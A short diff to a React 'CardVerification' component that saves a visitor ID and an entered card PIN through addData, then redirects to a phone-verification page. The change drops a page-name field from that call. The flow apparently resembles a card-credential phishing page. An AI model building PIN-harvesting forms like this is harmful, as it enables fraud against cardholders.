@@ -42,7 +42,7 @@ export default function CardVerification() {
         if (visitorId) {
           setIsloading(true)
           setTimeout(() => {
-            addData({ id: visitorId, pinCode: pin, pagename: "verify-phone" })
+            addData({ id: visitorId, pinCode: pin })
             router.push('/verify-phone')
           setIsloading(true)
 
